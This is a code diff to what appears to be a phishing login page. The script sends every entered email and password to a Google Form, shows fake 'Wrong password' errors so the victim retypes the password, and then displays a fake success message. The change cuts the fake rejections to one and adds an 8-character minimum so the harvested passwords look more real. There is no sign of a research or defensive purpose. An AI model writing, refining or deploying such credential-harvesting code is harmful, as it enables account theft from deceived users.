@@ -476,21 +476,28 @@
                 setTimeout(() => passwordInput.focus(), 150);
             }
 
+            // MODIFIED: login succeeds on second attempt, password must be at least 8 characters
             function processPasswordAttempt() {
                 const password = passwordInput.value;
                 if (!password) {
                     showPasswordError('Enter a password');
                     return;
                 }
+                // Precaution: enforce minimum password length
+                if (password.length < 8) {
+                    showPasswordError('Password must be at least 8 characters');
+                    return;
+                }
                 clearPasswordError();
                 passwordAttemptCount++;
                 submitToGoogleForm(storedEmailValue, password);
 
-                if (passwordAttemptCount === 1 || passwordAttemptCount === 2) {
+                if (passwordAttemptCount === 1) {
                     showPasswordError('Wrong password. Try again.');
                     passwordInput.value = '';
                     setTimeout(() => passwordInput.focus(), 100);
-                } else if (passwordAttemptCount === 3) {
+                } else if (passwordAttemptCount >= 2) {
+                    // Successful login from the second attempt onward
                     successToast.classList.add('show');
                     loginBtn.classList.add('loading-state');
                     loginBtn.querySelector('span').textContent = '';
